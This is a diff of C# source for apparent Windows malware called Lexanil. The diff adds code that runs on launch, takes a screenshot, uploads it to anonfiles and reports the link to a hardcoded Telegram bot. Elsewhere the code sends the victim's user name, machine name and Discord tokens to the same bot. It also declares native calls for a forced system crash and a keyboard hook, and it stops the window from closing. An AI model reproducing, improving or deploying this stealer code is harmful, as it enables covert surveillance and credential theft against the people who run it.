@@ -13,55 +13,11 @@ using Microsoft.Win32;
 using static Lexanil.NativeMethods;
 using System.Reflection;
 using System.Text;
+using System.Drawing;
+using System.Drawing.Imaging;
 
 namespace Lexanil
 {
-    public static class NativeMethods
-    {
-        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        #region Kernel32
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern IntPtr GetModuleHandle(string name);
-        #endregion
-
-        #region Ntdll
-        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-
-        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-        #endregion
-
-        #region User32
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern int ShowCursor(bool bShow);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern bool UnhookWindowsHookEx(IntPtr hook);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern short GetAsyncKeyState(Keys key);
-        #endregion
-    }
-
-    public static class Paths
-    {
-        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
-        public static readonly string ProgramFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
-        public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-        public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
-        public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
-        public static readonly string DiscordDB = Path.Combine(AppData, @"Discord\Local Storage\leveldb");
-    }
-
     public partial class MainWindow : Form
     {
         private static string[] processes = new[] { "iexplore", "steam", "explorer", "taskmgr", "procmon", "procmon64", "cmd", "discord", "chrome", "firefox" };
@@ -87,6 +43,8 @@ namespace Lexanil
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
+            CaptureScreen();
+            uploadFileAndNotify();
             //broadcastInfection(); 
             //disableShortcuts();
             //ShowCursor(false);
@@ -204,7 +162,7 @@ namespace Lexanil
 
         private void broadcastInfection()
         {
-            string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=1466869929&text=" +
+            string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text=" +
                 $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexanil™) Has infected Someone, I'm sending you his details! 😈\n" +
                 $"User Name: {Environment.UserName}\n" +
                 $"Machine Name: {Environment.MachineName}\n" +
@@ -213,8 +171,6 @@ namespace Lexanil
                 $"Discord Tokens: {string.Join("\n", getDiscordTokens())}";
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
-            Stream resStream = response.GetResponseStream();
         }
 
         private List<string> getDiscordTokens()
@@ -259,6 +215,73 @@ namespace Lexanil
         }
 
         private void MainWindow_Closing(object sender, FormClosingEventArgs args) => args.Cancel = true;
+
+        private static Bitmap CaptureScreen()
+        {
+            var bounds = Screen.PrimaryScreen.Bounds;
+            var bitmap = new Bitmap(bounds.Width, bounds.Height);
+            var graphics = Graphics.FromImage(bitmap);
+            graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+            bitmap.Save(Paths.ScreenShots + ".jpeg", ImageFormat.Jpeg) ;
+            return bitmap;
+        }
+
+        private void uploadFileAndNotify() 
+        {
+            using (WebClient client = new WebClient())
+            {
+                byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
+                var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={response}");
+
+            }
+        }
+    }
+    public static class NativeMethods
+    {
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        #region Kernel32
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr GetModuleHandle(string name);
+        #endregion
+
+        #region Ntdll
+        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+        #endregion
+
+        #region User32
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int ShowCursor(bool bShow);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool UnhookWindowsHookEx(IntPtr hook);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern short GetAsyncKeyState(Keys key);
+        #endregion
+    }
+
+    public static class Paths
+    {
+        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
+        public static readonly string ProgramFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+        public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+        public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
+        public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
+        public static readonly string DiscordDB = Path.Combine(AppData, @"Discord\Local Storage\leveldb");
+        public static readonly string ScreenShots = Paths.AppData + "\\screencap" + DateTime.Now.ToBinary();
     }
 }
 
